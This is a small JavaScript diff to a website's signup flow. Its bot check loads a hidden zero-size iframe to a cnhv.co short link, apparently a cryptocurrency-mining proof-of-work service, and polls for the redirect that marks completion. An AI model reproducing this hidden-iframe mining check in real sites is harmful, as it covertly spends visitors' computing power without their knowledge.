@@ -25,13 +25,15 @@ function advance() {
 }
 
 function testRobot() {
-    document.getElementById("pend").innerHTML = "<iframe id='pendCheck' src='https://cnhv.co/22gwq' width='0' height='0'></iframe>";
+    document.getElementById("pend").innerHTML = "<iframe id='pendCheck' src='https://cnhv.co/22gwq' width='0' height='0' border='0'></iframe>";
     setInterval(function() {
-        if (document.getElementById("pendCheck").contentWindow.location.href == "https://liveg-technologies.github.io/auroraservice/bbotdone.html") {
-            pbMove("pb", 100, function() {
-                document.getElementById("pbLabel").innerHTML = "You're not a robot!";
-            })
-        }
+        try {
+            if (document.getElementById("pendCheck").contentWindow.location.href == "https://liveg-technologies.github.io/auroraservice/bbotdone.html") {
+                pbMove("pb", 100, function() {
+                    document.getElementById("pbLabel").innerHTML = "You're not a robot!";
+                })
+            }
+        } catch (e) {}
     });
 }
 
@@ -94,7 +96,7 @@ function signupBefore() {
         document.getElementById("logout").style.display = "none";
     }
     testRobot();
-    setInterval(advance, 2000);
+    setInterval(advance, 3000);
 }
 
 function signup() {
